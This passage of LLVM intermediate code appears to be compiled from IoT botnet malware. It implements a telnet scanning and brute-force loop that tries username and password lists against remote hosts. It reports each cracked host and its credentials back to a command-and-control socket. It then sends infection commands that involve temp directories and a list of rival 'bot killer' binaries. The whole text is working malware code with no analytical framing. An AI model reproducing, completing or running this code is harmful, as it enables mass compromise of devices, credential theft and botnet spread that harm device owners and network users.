  %199 = load i32, i32* %6, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %200
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 16
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 0
  %208 = load i32, i32* %207, align 16
  %209 = call i32 (i32, i32, ...) @fcntl(i32 %208, i32 3, i8* null)
  %210 = or i32 %209, 2048
  %211 = call i32 (i32, i32, ...) @fcntl(i32 %203, i32 4, i32 %210)
  %212 = load i32, i32* %6, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 16
  %217 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %218 = call i32 @connect(i32 %216, %struct.sockaddr* %217, i32 16)
  %219 = icmp eq i32 %218, -1
  br i1 %219, label %220, label %228

; <label>:220:                                    ; preds = %198
  %221 = call i32* @__errno_location() #10
  %222 = load i32, i32* %221, align 4
  %223 = icmp ne i32 %222, 115
  br i1 %223, label %224, label %228

; <label>:224:                                    ; preds = %220
  %225 = load i32, i32* %6, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %226
  call void @reset_telstate(%struct.telstate_t* %227)
  br label %232

; <label>:228:                                    ; preds = %220, %198
  %229 = load i32, i32* %6, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %230
  call void @advance_telstate(%struct.telstate_t* %231, i32 1)
  br label %232

; <label>:232:                                    ; preds = %228, %224
  br label %881

; <label>:233:                                    ; preds = %90
  br label %234

; <label>:234:                                    ; preds = %233
  %235 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %236 = getelementptr inbounds [16 x i64], [16 x i64]* %235, i64 0, i64 0
  %237 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %236) #5, !srcloc !5
  %238 = extractvalue { i64, i64* } %237, 0
  %239 = extractvalue { i64, i64* } %237, 1
  %240 = trunc i64 %238 to i32
  store i32 %240, i32* %21, align 4
  %241 = ptrtoint i64* %239 to i64
  %242 = trunc i64 %241 to i32
  store i32 %242, i32* %22, align 4
  br label %243

; <label>:243:                                    ; preds = %234
  br label %244

; <label>:244:                                    ; preds = %243
  %245 = load i32, i32* %6, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 0
  %249 = load i32, i32* %248, align 16
  %250 = srem i32 %249, 64
  %251 = zext i32 %250 to i64
  %252 = shl i64 1, %251
  %253 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %254 = load i32, i32* %6, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %255
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 16
  %259 = sdiv i32 %258, 64
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds [16 x i64], [16 x i64]* %253, i64 0, i64 %260
  %262 = load i64, i64* %261, align 8
  %263 = or i64 %262, %252
  store i64 %263, i64* %261, align 8
  %264 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %264, align 8
  %265 = load i32, i32* %3, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %266, i64* %267, align 8
  %268 = load i32, i32* %6, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 16
  %273 = add nsw i32 %272, 1
  %274 = call i32 @select(i32 %273, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %274, i32* %7, align 4
  %275 = load i32, i32* %7, align 4
  %276 = icmp eq i32 %275, 1
  br i1 %276, label %277, label %313

; <label>:277:                                    ; preds = %244
  %278 = load i32, i32* %6, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %279
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %280, i32 0, i32 7
  store i32 0, i32* %281, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %282 = load i32, i32* %6, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %283
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 16
  %287 = bitcast i32* %15 to i8*
  %288 = call i32 @getsockopt(i32 %286, i32 1, i32 4, i8* %287, i32* %14) #5
  %289 = load i32, i32* %15, align 4
  %290 = icmp ne i32 %289, 0
  br i1 %290, label %291, label %295

; <label>:291:                                    ; preds = %277
  %292 = load i32, i32* %6, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %293
  call void @reset_telstate(%struct.telstate_t* %294)
  br label %312

; <label>:295:                                    ; preds = %277
  %296 = load i32, i32* %6, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %297
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %298, i32 0, i32 0
  %300 = load i32, i32* %299, align 16
  %301 = load i32, i32* %6, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 16
  %306 = call i32 (i32, i32, ...) @fcntl(i32 %305, i32 3, i8* null)
  %307 = and i32 %306, -2049
  %308 = call i32 (i32, i32, ...) @fcntl(i32 %300, i32 4, i32 %307)
  %309 = load i32, i32* %6, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %310
  call void @advance_telstate(%struct.telstate_t* %311, i32 2)
  br label %312

; <label>:312:                                    ; preds = %295, %291
  br label %882

; <label>:313:                                    ; preds = %244
  %314 = load i32, i32* %7, align 4
  %315 = icmp eq i32 %314, -1
  br i1 %315, label %316, label %320

; <label>:316:                                    ; preds = %313
  %317 = load i32, i32* %6, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %318
  call void @reset_telstate(%struct.telstate_t* %319)
  br label %882

; <label>:320:                                    ; preds = %313
  br label %321

; <label>:321:                                    ; preds = %320
  %322 = load i32, i32* %6, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 7
  %326 = load i32, i32* %325, align 16
  %327 = add i32 %326, 7
  %328 = zext i32 %327 to i64
  %329 = call i64 @time(i64* null) #5
  %330 = icmp slt i64 %328, %329
  br i1 %330, label %331, label %335

; <label>:331:                                    ; preds = %321
  %332 = load i32, i32* %6, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %333
  call void @reset_telstate(%struct.telstate_t* %334)
  br label %335

; <label>:335:                                    ; preds = %331, %321
  br label %881

; <label>:336:                                    ; preds = %90
  %337 = load i32, i32* %6, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = load i32, i32* %3, align 4
  %343 = load i32, i32* %6, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 9
  %347 = load i8*, i8** %346, align 8
  %348 = call i32 @read_until_response(i32 %341, i32 %342, i8* %347, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %349 = icmp ne i32 %348, 0
  br i1 %349, label %350, label %373

; <label>:350:                                    ; preds = %336
  %351 = call i64 @time(i64* null) #5
  %352 = trunc i64 %351 to i32
  %353 = load i32, i32* %6, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %354
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %355, i32 0, i32 7
  store i32 %352, i32* %356, align 16
  %357 = load i32, i32* %6, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 9
  %361 = load i8*, i8** %360, align 8
  %362 = call i32 @contains_fail(i8* %361)
  %363 = icmp ne i32 %362, 0
  br i1 %363, label %364, label %368

; <label>:364:                                    ; preds = %350
  %365 = load i32, i32* %6, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %366
  call void @advance_telstate(%struct.telstate_t* %367, i32 0)
  br label %372

; <label>:368:                                    ; preds = %350
  %369 = load i32, i32* %6, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %370
  call void @advance_telstate(%struct.telstate_t* %371, i32 3)
  br label %372

; <label>:372:                                    ; preds = %368, %364
  br label %882

; <label>:373:                                    ; preds = %336
  %374 = load i32, i32* %6, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %375
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %376, i32 0, i32 7
  %378 = load i32, i32* %377, align 16
  %379 = add i32 %378, 7
  %380 = zext i32 %379 to i64
  %381 = call i64 @time(i64* null) #5
  %382 = icmp slt i64 %380, %381
  br i1 %382, label %383, label %387

; <label>:383:                                    ; preds = %373
  %384 = load i32, i32* %6, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %385
  call void @reset_telstate(%struct.telstate_t* %386)
  br label %387

; <label>:387:                                    ; preds = %383, %373
  br label %881

; <label>:388:                                    ; preds = %90
  %389 = load i32, i32* %6, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 0
  %393 = load i32, i32* %392, align 16
  %394 = load i32, i32* %6, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %395
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %396, i32 0, i32 4
  %398 = load i8, i8* %397, align 2
  %399 = zext i8 %398 to i64
  %400 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %399
  %401 = load i8*, i8** %400, align 8
  %402 = load i32, i32* %6, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %403
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %404, i32 0, i32 4
  %406 = load i8, i8* %405, align 2
  %407 = zext i8 %406 to i64
  %408 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %407
  %409 = load i8*, i8** %408, align 8
  %410 = call i64 @strlen(i8* %409) #9
  %411 = call i64 @send(i32 %393, i8* %401, i64 %410, i32 16384)
  %412 = icmp slt i64 %411, 0
  br i1 %412, label %413, label %417

; <label>:413:                                    ; preds = %388
  %414 = load i32, i32* %6, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %415
  call void @reset_telstate(%struct.telstate_t* %416)
  br label %882

; <label>:417:                                    ; preds = %388
  %418 = load i32, i32* %6, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 16
  %423 = call i64 @send(i32 %422, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %424 = icmp slt i64 %423, 0
  br i1 %424, label %425, label %429

; <label>:425:                                    ; preds = %417
  %426 = load i32, i32* %6, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %427
  call void @reset_telstate(%struct.telstate_t* %428)
  br label %882

; <label>:429:                                    ; preds = %417
  %430 = load i32, i32* %6, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %431
  call void @advance_telstate(%struct.telstate_t* %432, i32 4)
  br label %881

; <label>:433:                                    ; preds = %90
  %434 = load i32, i32* %6, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 0
  %438 = load i32, i32* %437, align 16
  %439 = load i32, i32* %3, align 4
  %440 = load i32, i32* %6, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 9
  %444 = load i8*, i8** %443, align 8
  %445 = call i32 @read_until_response(i32 %438, i32 %439, i8* %444, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %446 = icmp ne i32 %445, 0
  br i1 %446, label %447, label %470

; <label>:447:                                    ; preds = %433
  %448 = call i64 @time(i64* null) #5
  %449 = trunc i64 %448 to i32
  %450 = load i32, i32* %6, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %451
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %452, i32 0, i32 7
  store i32 %449, i32* %453, align 16
  %454 = load i32, i32* %6, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 9
  %458 = load i8*, i8** %457, align 8
  %459 = call i32 @contains_fail(i8* %458)
  %460 = icmp ne i32 %459, 0
  br i1 %460, label %461, label %465

; <label>:461:                                    ; preds = %447
  %462 = load i32, i32* %6, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %463
  call void @advance_telstate(%struct.telstate_t* %464, i32 0)
  br label %469

; <label>:465:                                    ; preds = %447
  %466 = load i32, i32* %6, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %467
  call void @advance_telstate(%struct.telstate_t* %468, i32 5)
  br label %469

; <label>:469:                                    ; preds = %465, %461
  br label %882

; <label>:470:                                    ; preds = %433
  %471 = load i32, i32* %6, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 7
  %475 = load i32, i32* %474, align 16
  %476 = add i32 %475, 7
  %477 = zext i32 %476 to i64
  %478 = call i64 @time(i64* null) #5
  %479 = icmp slt i64 %477, %478
  br i1 %479, label %480, label %484

; <label>:480:                                    ; preds = %470
  %481 = load i32, i32* %6, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %482
  call void @reset_telstate(%struct.telstate_t* %483)
  br label %484

; <label>:484:                                    ; preds = %480, %470
  br label %881

; <label>:485:                                    ; preds = %90
  %486 = load i32, i32* %6, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 0
  %490 = load i32, i32* %489, align 16
  %491 = load i32, i32* %6, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 5
  %495 = load i8, i8* %494, align 1
  %496 = zext i8 %495 to i64
  %497 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %496
  %498 = load i8*, i8** %497, align 8
  %499 = load i32, i32* %6, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 5
  %503 = load i8, i8* %502, align 1
  %504 = zext i8 %503 to i64
  %505 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %504
  %506 = load i8*, i8** %505, align 8
  %507 = call i64 @strlen(i8* %506) #9
  %508 = call i64 @send(i32 %490, i8* %498, i64 %507, i32 16384)
  %509 = icmp slt i64 %508, 0
  br i1 %509, label %510, label %514

; <label>:510:                                    ; preds = %485
  %511 = load i32, i32* %6, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %512
  call void @reset_telstate(%struct.telstate_t* %513)
  br label %882

; <label>:514:                                    ; preds = %485
  %515 = load i32, i32* %6, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %516
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %517, i32 0, i32 0
  %519 = load i32, i32* %518, align 16
  %520 = call i64 @send(i32 %519, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %521 = icmp slt i64 %520, 0
  br i1 %521, label %522, label %526

; <label>:522:                                    ; preds = %514
  %523 = load i32, i32* %6, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %524
  call void @reset_telstate(%struct.telstate_t* %525)
  br label %882

; <label>:526:                                    ; preds = %514
  %527 = load i32, i32* %6, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %528
  call void @advance_telstate(%struct.telstate_t* %529, i32 6)
  br label %881

; <label>:530:                                    ; preds = %90
  %531 = load i32, i32* %6, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 0
  %535 = load i32, i32* %534, align 16
  %536 = load i32, i32* %3, align 4
  %537 = load i32, i32* %6, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 9
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @read_until_response(i32 %535, i32 %536, i8* %541, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %543 = icmp ne i32 %542, 0
  br i1 %543, label %544, label %615

; <label>:544:                                    ; preds = %530
  %545 = call i64 @time(i64* null) #5
  %546 = trunc i64 %545 to i32
  %547 = load i32, i32* %6, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 7
  store i32 %546, i32* %550, align 16
  %551 = load i32, i32* %6, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 9
  %555 = load i8*, i8** %554, align 8
  %556 = call i32 @contains_fail(i8* %555)
  %557 = icmp ne i32 %556, 0
  br i1 %557, label %558, label %562

; <label>:558:                                    ; preds = %544
  %559 = load i32, i32* %6, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %560
  call void @advance_telstate(%struct.telstate_t* %561, i32 0)
  br label %614

; <label>:562:                                    ; preds = %544
  %563 = load i32, i32* %6, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %564
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %565, i32 0, i32 9
  %567 = load i8*, i8** %566, align 8
  %568 = call i32 @contains_success(i8* %567)
  %569 = icmp ne i32 %568, 0
  br i1 %569, label %570, label %609

; <label>:570:                                    ; preds = %562
  %571 = load i32, i32* %6, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %572
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %573, i32 0, i32 3
  %575 = load i8, i8* %574, align 1
  %576 = zext i8 %575 to i32
  %577 = icmp eq i32 %576, 2
  br i1 %577, label %578, label %582

; <label>:578:                                    ; preds = %570
  %579 = load i32, i32* %6, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %580
  call void @advance_telstate(%struct.telstate_t* %581, i32 7)
  br label %608

; <label>:582:                                    ; preds = %570
  %583 = load i32, i32* @mainCommSock, align 4
  %584 = load i32, i32* %6, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %585
  %587 = call i8* @get_telstate_host(%struct.telstate_t* %586)
  %588 = load i32, i32* %6, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 4
  %592 = load i8, i8* %591, align 2
  %593 = zext i8 %592 to i64
  %594 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %593
  %595 = load i8*, i8** %594, align 8
  %596 = load i32, i32* %6, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 5
  %600 = load i8, i8* %599, align 1
  %601 = zext i8 %600 to i64
  %602 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %601
  %603 = load i8*, i8** %602, align 8
  %604 = call i32 (i32, i8*, ...) @sockprintf(i32 %583, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i32 0, i32 0), i8* %587, i8* %595, i8* %603)
  %605 = load i32, i32* %6, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %606
  call void @advance_telstate(%struct.telstate_t* %607, i32 7)
  br label %608

; <label>:608:                                    ; preds = %582, %578
  br label %613

; <label>:609:                                    ; preds = %562
  %610 = load i32, i32* %6, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %611
  call void @reset_telstate(%struct.telstate_t* %612)
  br label %613

; <label>:613:                                    ; preds = %609, %608
  br label %614

; <label>:614:                                    ; preds = %613, %558
  br label %882

; <label>:615:                                    ; preds = %530
  %616 = load i32, i32* %6, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %617
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %618, i32 0, i32 7
  %620 = load i32, i32* %619, align 16
  %621 = add i32 %620, 7
  %622 = zext i32 %621 to i64
  %623 = call i64 @time(i64* null) #5
  %624 = icmp slt i64 %622, %623
  br i1 %624, label %625, label %629

; <label>:625:                                    ; preds = %615
  %626 = load i32, i32* %6, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %627
  call void @reset_telstate(%struct.telstate_t* %628)
  br label %629

; <label>:629:                                    ; preds = %625, %615
  br label %881

; <label>:630:                                    ; preds = %90
  %631 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %632 = call i32 (i8*, i8*, ...) @sprintf(i8* %631, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %633 = load i32, i32* %6, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 0
  %637 = load i32, i32* %636, align 16
  %638 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %639 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %640 = call i64 @strlen(i8* %639) #9
  %641 = call i64 @send(i32 %637, i8* %638, i64 %640, i32 16384)
  %642 = icmp slt i64 %641, 0
  br i1 %642, label %643, label %647

; <label>:643:                                    ; preds = %630
  %644 = load i32, i32* %6, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %645
  call void @reset_telstate(%struct.telstate_t* %646)
  br label %882

; <label>:647:                                    ; preds = %630
  call void @RemoveTempDirs()
  %648 = load i32, i32* @mainCommSock, align 4
  %649 = load i32, i32* %6, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %650
  %652 = call i8* @get_telstate_host(%struct.telstate_t* %651)
  %653 = load i32, i32* %6, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 4
  %657 = load i8, i8* %656, align 2
  %658 = zext i8 %657 to i64
  %659 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %658
  %660 = load i8*, i8** %659, align 8
  %661 = load i32, i32* %6, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %662
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %663, i32 0, i32 5
  %665 = load i8, i8* %664, align 1
  %666 = zext i8 %665 to i64
  %667 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %666
  %668 = load i8*, i8** %667, align 8
  %669 = call i32 (i32, i8*, ...) @sockprintf(i32 %648, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i32 0, i32 0), i8* %652, i8* %660, i8* %668)
  %670 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %671 = call i32 (i8*, i8*, ...) @sprintf(i8* %670, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %672 = load i32, i32* %6, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %673
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %674, i32 0, i32 0
  %676 = load i32, i32* %675, align 16
  %677 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %678 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %679 = call i64 @strlen(i8* %678) #9
  %680 = call i64 @send(i32 %676, i8* %677, i64 %679, i32 16384)
  %681 = icmp slt i64 %680, 0
  br i1 %681, label %682, label %686

